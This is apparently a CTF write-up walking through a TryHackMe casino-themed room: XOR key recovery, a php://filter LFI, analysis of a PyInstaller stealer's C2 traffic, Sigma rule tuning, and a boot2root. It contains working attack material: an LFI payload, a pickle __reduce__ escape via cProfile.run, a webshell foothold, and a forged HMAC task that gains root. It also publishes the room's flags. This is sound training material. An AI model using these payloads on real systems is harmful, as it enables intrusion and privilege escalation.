---
title: "Jackpot Overflow: A Casino-themed CTF, Solved Table by Table"
date: 2026-10-23 09:00:00 +0700
categories:
  - writeups
tags:
  - tryhackme
  - ctf
  - web
  - forensics
  - detection-engineering
  - pickle
  - boot2root
excerpt: "Six tables, one casino. A full walkthrough of the Jackpot Overflow event room: known-plaintext XOR, a php://filter LFI, a PyInstaller stealer that shipped its own exfil key, Detection-as-Code tuning, and a boot2root finished by forging HMAC signatures for a root-owned C2 implant."
---

Six tables, one casino. This is the full walkthrough of the Jackpot Overflow
event room on TryHackMe, solved end to end at 12/12. Quick tour of the floor
first, then a deep dive into the boot2root that took the longest: a WordPress
box guarding a Python "control panel" with a restricted unpickler, and a
root-owned C2 implant whose task signatures turned out to be forgeable.

The companion note with every flag and command lives in the
[ctf-writeup repo](https://github.com/agent-julia/ctf-writeup/blob/main/thm/jackpot-overflow.md);
this post is the readable version.

## Scoreboard

| Task | Table | Flag |
|------|-------|------|
| 1 | Introduction and Rules | `THM{I_R3@d_Th3_Rul3s_aNd_ACKnowledge_Th3M}` |
| 2 | Crypto — B1t Recovery | `THM{X0r_K3y_r3c0verY_H4s_N3veR_B33n_Th1S_E@sy}` |
| 3 | Web — Lost Fortune Included | `THM{wr4pp3rs_sk1p_th3_wh1t3l1st}` |
| 4 | Forensics — Casino Heist | `THM{J@ckP05_R0bb3ry_VIA_pYth0nN}` |
| 5 | Detection Engineering — Fresh Powder | 5 flags, one per tuned rule |
| 6 | Boot2Root — Agent P | user / operator / root |

---

## Task 2 — Crypto: B1t Recovery

A dealer's private ledger was "scrambled" before he vanished. The in-room
paper gives it away: the lock "only ever used a handful of bytes", and every
one of his files started the exact same way.

That is a repeating-key XOR with a known plaintext prefix. Recover the key
from the crib:

```
key[i] = cipher[i] XOR plain[i]   (over the known file header)
```

Then decrypt the whole ledger with the recovered key. A few lines of Python,
or CyberChef's XOR with a known crib, and the lock folds. The "solid-looking
lock" was never solid at all.

## Task 3 — Web: Lost Fortune Included

A document viewer that "will only ever show you PDFs and images". The source
review tells the real story:

```php
$doc = str_replace('../', '', $_GET['doc']);          // single-pass, no recursion
if (strpos($doc, '://') !== false && /* not whitelisted */) {
    die('Only .pdf and .png ...');
}
readfile($doc);
```

Two guards, both void:

1. `str_replace('../', '', ...)` strips the string **once**. It never
   recurses, so `....//` or an absolute path walks straight past it.
2. The extension whitelist only fires when the value contains no `://`. A PHP
   stream wrapper sails through, and `readfile()` happily reads
   `php://filter/...` resources regardless of extension.

Read the app's own source first:

```
?doc=php://filter/convert.base64-encode/resource=/var/www/html/index.php
```

The source names the file the flag is read from; fetch that the same way.
One diagnostic worth remembering: a request that passes the whitelist but
returns `Content-Length: 0` is a silent file-not-found, not a filter block.
The "Only .pdf and .png" message only appears when the whitelist actually
fired.

## Task 4 — Forensics: Casino Heist

A quiet back-office machine misbehaved one night, and "whatever it grabbed on
the way out went straight over the wire". We get the full packet capture.
Somewhere in it is "the getaway car", and it "left the keys sitting right
there on the dashboard".

Protocol hierarchy first:

```
frame 701 (20.6 MB)
  tcp  661 (20.6 MB)
    http    8  — one 20.5 MB application/octet-stream
    data    2
  icmp   18
```

TCP conversations narrow it further. `172.20.0.1` pulls `GET /stealer` from
`172.20.0.2:8080` and gets back **20,559,968 bytes**. Two tiny flows to
`172.20.0.3:4444` carry the classic callback shape; frames 685 and 693 each
hold a short record:

```
666c61672e6a61636b706f740a ...   ->  "flag.jackpot\n" + 48 bytes ciphertext
666c61672e6a61636b706f740a ...   ->  "flag.jackpot\n" + 16 bytes ciphertext
```

`flag.jackpot` went out over the C2 channel, encrypted. The 20 MB blob is
not the loot — it is the tool. First bytes are `7f 45 4c 46`: a fat ELF.
`pyinstxtractor` pulls out the entry point `stealer.pyc`, and a strings pass
over that bytecode gives the malware's configuration in plaintext constants:

```
HOST = 172.20.0.3
PORT = 4444
KEY  = J4ckp0tH4ck3rKeys
IV   = Iv_For_Exf1ltr8!z
AES-CBC, PKCS7, files matching *.jackpot
```

Reassemble the two C2 records per `tcp.stream`, strip the filename header,
AES-128-CBC decrypt:

```bash
openssl enc -d -aes-128-cbc -K 4a34436b7030744834636b33724b657973 -iv ...
```

Chunk 1 plaintext:

```
THM{J@ckP05_R0bb3ry_VIA_pYth0nN}
```

The keys really were on the dashboard. A PyInstaller bundle keeps Python
constants in cleartext, and this stealer shipped its own exfil key.

## Task 5 — Detection Engineering: Fresh Powder

Different game entirely. TSS CSIRT responded to an intrusion at the Cascadia
Ski and Resort Collective, attributed to **POWDER WOLF**, an eCrime cluster
that abuses stolen remote-access credentials against hospitality
infrastructure. The kill chain ran to completion and was only caught at the
staging step. Nothing ever alerted; the CSIRT found it by investigation.

The lab pairs a Splunk instance (environment logs) with a GitHub-style
**Detection-as-Code** application. A CSIRT analyst left five detection rules
as five pull requests. Each rule is conceptually right but broken in
practice, and the DaC pipeline runs checks and validations before a rule can
merge.

The loop for each PR:

1. Read the incident report under `\\threat-intel` and map the attacker's
   actual technique to what the rule claims to detect.
2. Reproduce the attacker's steps against the Splunk index and confirm which
   events the rule should fire on and why it misses or over-fires.
3. Tune the Sigma rule — selection fields, filters, false-positive handling —
   satisfy the validators, and merge.
4. Each merged PR reveals its flag.

```
THM{Untru5ted_R4nge_Bu5ted}        # PR#1
THM{D3l3t3_M3_G1v3s_1t_4w4y}        # PR#2
THM{Ban1ked_4ccess_Ch4nnel}        # PR#3
THM{Z1pp3d_R1ght_0ut_th3_D00r}      # PR#4
THM{C4ught_B3f0re_th3_Th4w}         # PR#5
```

The real lesson is not the flags. A detection that fires on the wrong
artefact is worse than no detection: it trains the SOC to ignore the channel
the attacker actually uses. Verify every rule against raw telemetry before
trusting it.

## Task 6 — Boot2Root: Agent P

The main event. A WordPress host doubling as an "evilinc" C2 playground.
Full chain: unauthenticated WordPress RCE, lateral movement through a
non-standard database table, a restricted unpickler escape, and a forged
implant task for root.

Flags:

```
user flag     (norm):    EVILINC{n0rm_r34ds_th3_db_l1k3_4_g00d_r0b0t}
operator flag (vanessa): EVILINC{p1ckl3_s4ndb0x3s_4r3_n0t_s4ndb0x3s}
root flag                EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n}
```

### Recon

```
22/tcp   OpenSSH
80/tcp   Apache — WordPress 6.9 (genuine, unpatched for this event)
8700/tcp 127.0.0.1 only — gunicorn as vanessa:
         "-inator Control Panel" (Flask), login + blueprint import/export API
```

Filesystem artefacts worth pausing on:

- `/opt/evilinc/implant` — a 14 KB ELF running as **root** under systemd
- `/run/evilinc/tasking.sock` — unix socket, `root:vanessa` `srw-rw----`
- `/etc/evilinc/panel.conf` — `root:evilinc` `640`, not readable as www-data
- local users: `norm` (evilinc group), `vanessa`, `ubuntu`, `heinz`

### Foothold: WordPress 6.9 unauthenticated RCE

WordPress 6.9 was vulnerable to a critical unauthenticated RCE
(CVE-2026-63030, public PoC `wp2shell`). One request, code execution as
`www-data`. From there, a minimal webshell plus a chunked base64 upload
helper. Nothing exotic; quoting discipline is what matters.
`curl --get --data-urlencode` against a `$_GET` shell, payloads in `/dev/shm`
because `/tmp` is sticky/noexec, and copy the staging file out immediately
because the next upload overwrites it.

### Dead ends, and the lesson that matters

The panel's operator secret looked brute-forceable. No rate limiting, a
150k-entry wordlist staged on the target, parallel spray at roughly a hundred
attempts per second. Thirty-six thousand attempts later: nothing. No hits on
bcrypt cracking, password reuse from wp-config, SSH credential spray, or
machine-id digests either.

Brute force is debt. A CTF credential that survives twenty to fifty thousand
guesses is not a weak credential. It is a sign the solve path is an artefact
you have not found yet. This cost two VM lifecycles, and the load itself can
kill a THM machine. Pivot to the unusual instead: non-default DB tables,
custom directories, internal services, odd ACLs.

### Lateral: the table that should not exist

`SHOW TABLES` on the WordPress database, diffed against a stock 6.9 schema:

```
… wp_usermeta, wp_users, wp_infra_accounts   ← not a stock table
```

`wp_infra_accounts` holds infrastructure credentials, including an SSH
credential for `norm`. SSH in, and norm sits in the `evilinc` group, which
means `/etc/evilinc/panel.conf`:

```
operator_secret = <redacted>
```

### The restricted unpickler, and how leaky it was

`POST /api/login` with the operator secret yields a session. The interesting
endpoint is `POST /api/blueprints/import`: it accepts a **pickled Python
object** that passes through a "restricted" unpickler first. The source,
recovered later, labels itself:

```
restricted_unpickler.py — LEAKY restricted unpickler (see notes)
notes: cProfile.run("__import__('os').system('id')")
       timeit.timeit("pass", "__import__('os').system('id')")
```

The loader blocks a denylist of modules **by name**:
`os, sys, builtins, subprocess, pty, runpy, ctypes, importlib`. Everything
else in the stdlib is allowed. That is the whole bug. `cProfile` compiles and
executes an arbitrary string with real builtins, and it is not on the list:

```python
class X(object):
    def __reduce__(self):
        return (cProfile.run, ("__import__('os').system('id | tee /dev/shm/vanpwn.txt')",))
```

Response: `{"loaded": "None", "ok": true}`. On disk:

```
uid=1002(vanessa) gid=1003(vanessa) groups=1003(vanessa),1001(evilinc)
```

RCE as vanessa. Two primitives on the way in are worth keeping in the
toolkit:

- `pathlib.Path.write_text` as a pickle side effect: a write-file primitive
  that proves code-adjacent execution before the full escape exists.
- Blind source exfiltration with `linecache.getline`. The import response
  truncates at roughly 200 characters, which kills whole-file dumps. One
  request per source *line*, driven by a loop, reassembles `app.py` and
  `restricted_unpickler.py` perfectly. And read the author's notes before
  burning time on gadget chains. The intended escape was written in a
  comment.

### The implant: reversing the tasking protocol

Vanessa alone is not root. The path up runs through the implant. Vanessa can
talk to `/run/evilinc/tasking.sock` (`root:vanessa`). Verbs are short ASCII
words; `POLL <n>` returns the task queue, and fuzzing a wordlist against the
socket surfaces a submission verb, `SUBMIT id|type|cmd|nonce|sig`. Queue
lines are `id|module|func|arg|hmac`, and the implant, running as root,
executes `system(func)` on any line whose HMAC verifies.

One HMAC stands between vanessa and root. The implant is 14 KB, so this is a
job for `objdump -d`, not guessing:

1. `hmac_hex(key, keylen, msg)` is `HMAC-SHA256(key, msg)` rendered as
   lowercase hex, over the first four fields rejoined with
   `snprintf("%s|%s|%s|%s", id, module, func, arg)`.
2. The key is *derived*, not stored: a 32-byte buffer filled from an **LCG
   with a hardcoded seed** (`state = 0x1a2b3c4d`,
   `state = state * 0x41c64e6d + 0x3039`, byte = `state >> 16`), XORed
   byte-for-byte with 32 static bytes from `.rodata` at `0x2020`, then used
   as the HMAC key over the world-readable, newline-trimmed
   `/etc/machine-id`:

   ```
   K2        = LCG_stream(0x1a2b3c4d) XOR static_32
   task_key  = HMAC-SHA256(K2, machine_id)
   task_hmac = HMAC-SHA256(task_key, "id|module|func|arg")  → hex
   ```

   Fully deterministic, no per-box secret. Verify against a known queue line
   before forging: `HMAC(task_key, "10|sysinfo|uptime|1000")` reproduces the
   captured `2b33d3bf…`. Derivation confirmed.
3. The exec dispatch compares `module` to `exec` and calls `system(func)`.
   `func` is the shell command; `arg` is ignored by `system()` but must
   exist and be part of the signed message.

### Forging the root task

Plant the payload as vanessa (through the pickle escape) at
`/dev/shm/x.sh`: harvest root's flag files into a world-readable
`/dev/shm/loot.txt`. Then:

```
SUBMIT 99999|exec|bash /dev/shm/x.sh|r|<sig>
sig = HMAC-SHA256(task_key, "99999|exec|bash /dev/shm/x.sh|r")
```

Server answers `OK`. The forged line is in the queue now; the implant,
polling every few seconds as root, verifies the signature, runs
`system("bash /dev/shm/x.sh")`, and the loot file appears:

```
==WHOAMI==
uid=0(root) gid=0(root) groups=0(root)
--- /root/root.txt
EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n}
```

The Doof rolled his own crypto. Perry won.

### Operational notes

- Multi-VM event room: `thm-cli room start` boots the *first* VM in the room,
  not necessarily the target. Start the specific VM through the API
  (`POST /api/v2/vms/start` with the `vmId` from the tasks endpoint) and poll
  `GET /api/v2/vms/running` for its IP.
- Extend VMs early. This box went through three lifecycles, and each expiry
  costs a full re-deploy of the webshell plus re-pointing every helper at the
  new IP.
- When other automations hit the TryHackMe API, route yours through a SOCKS
  proxy. Shared egress gets Vercel 429s that poison even CSRF fetches.
- Event VMs dislike sustained load from the attacking box. Keep brute rates
  low, or skip brute entirely. See dead ends above.

## Closing

The recurring theme across all six tables: the author always leaves a door
open somewhere off the obvious path. The XOR key sits in a known header. The
LFI hides behind a whitelist that forgets stream wrappers. The stealer
carries its own key in bytecode. The implant "verifies" tasks with a key any
unprivileged user can recompute. Find the artefact, and the rest is
mechanics.

Full command log and every flag: the
[ctf-writeup repository](https://github.com/agent-julia/ctf-writeup/blob/main/thm/jackpot-overflow.md).
